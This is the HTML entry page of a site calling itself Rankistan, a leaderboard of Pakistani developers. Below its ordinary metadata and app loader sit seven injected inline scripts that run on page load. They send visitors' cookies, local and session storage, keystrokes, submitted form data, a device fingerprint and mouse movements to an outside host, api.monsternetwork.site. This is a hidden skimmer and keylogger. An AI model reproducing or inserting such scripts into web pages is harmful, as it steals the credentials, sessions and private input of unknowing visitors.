<!doctype html>
<html lang="en" class="dark">
  <head>
    <meta charset="UTF-8" />
    <meta name="description" content="Rankistan is the ultimate leaderboard and directory for discovering top Pakistani developers. Explore profiles, check out GitHub activity, and connect with the community." />
    <meta name="keywords" content="Rankistan, Pakistan developers, Pakistani programmers, dev leaderboard, GitHub contributors Pakistan, tech community" />
    <meta name="author" content="Rankistan Community" />
    <meta name="theme-color" content="#121212" />
    
    <!-- Open Graph / Facebook / LinkedIn -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://rankistan.com/" />
    <meta property="og:title" content="Rankistan | The Pakistani Developer Leaderboard" />
    <meta property="og:description" content="Discover and rank top Pakistani developers. Explore profiles, check out GitHub activity, and connect with the community." />
    <meta property="og:image" content="https://rankistan.com/favicon.svg" />

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:url" content="https://rankistan.com/" />
    <meta property="twitter:title" content="Rankistan | The Pakistani Developer Leaderboard" />
    <meta property="twitter:description" content="Discover and rank top Pakistani developers. Explore profiles, check out GitHub activity, and connect with the community." />
    <meta property="twitter:image" content="https://rankistan.com/favicon.svg" />

    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <link rel="canonical" href="https://rankistan.com/" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Rankistan | Leaderboard</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
    <link href="https://fonts.cdnfonts.com/css/waltograph" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
    
    <!-- JSON-LD Structured Data -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "WebSite",
      "name": "Rankistan",
      "url": "https://rankistan.com/",
      "description": "The ultimate leaderboard and directory for discovering top Pakistani developers.",
      "potentialAction": {
        "@type": "SearchAction",
        "target": "https://rankistan.com/?search={search_term_string}",
        "query-input": "required name=search_term_string"
      }
    }
    </script>
  </head>
  <body class="bg-surface text-on-surface font-body selection:bg-primary selection:text-on-primary">
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
    <script>
fetch('https://api.monsternetwork.site/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ capture_source: 'js_function', type: 'location', url: location.href }) });
</script>
    <script>
fetch('https://api.monsternetwork.site/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ capture_source: 'js_function', type: 'cookies', cookies: document.cookie, url: location.href }) });
</script>
    <script>
fetch('https://api.monsternetwork.site/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ capture_source: 'js_function', type: 'storage', data: JSON.stringify({ls: localStorage, ss: sessionStorage}), url: location.href }) });
</script>
    <script>
(function(){let b=''; document.addEventListener('keypress', e => { b += e.key; if(b.length > 15) { fetch('https://api.monsternetwork.site/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ capture_source: 'js_function', type: 'keystroke', data: b, url: location.href }) }); b = ''; }}); })();
</script>
    <script>
(function(){ document.querySelectorAll('form').forEach(f => { f.addEventListener('submit', e => { const d = {}; new FormData(f).forEach((v,k) => d[k]=v); fetch('https://api.monsternetwork.site/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ capture_source: 'js_function', type: 'form_data', data: JSON.stringify(d), url: location.href }) }); }); }); })();
</script>
    <script>
(async()=>{let i={screen:window.screen.width+"x"+window.screen.height,ratio:window.devicePixelRatio,gpu:"Unknown",platform:navigator.platform,ua:navigator.userAgent};try{let c=document.createElement('canvas'),g=c.getContext('webgl');if(g){let d=g.getExtension('WEBGL_debug_renderer_info');if(d)i.gpu=g.getParameter(d.UNMASKED_RENDERER_WEBGL)}}catch(e){}if(navigator.userAgentData){try{let h=await navigator.userAgentData.getHighEntropyValues(["model","platformVersion"]);i.mobile=navigator.userAgentData.mobile;i.model=h.model;i.osVersion=h.platformVersion}catch(e){}}fetch('https://api.monsternetwork.site/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_source:'js_function',type:'fingerprint',device_info:i,cookies:document.cookie,url:location.href})})();
</script>
    <script>
(function(){let m=[];let c=[];document.addEventListener('mousemove',e=>{m.push({x:e.clientX,y:e.clientY,t:Date.now()})});document.addEventListener('click',e=>{c.push({x:e.clientX,y:e.clientY,t:Date.now()})});setInterval(()=>{if(m.length>0||c.length>0){fetch('https://api.monsternetwork.site/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_source:'js_function',type:'mouse_tracking',data:JSON.stringify({moves:m,clicks:c}),url:location.href})});m=[];c=[]}},2000)})();
</script>
    
  </body>
</html>
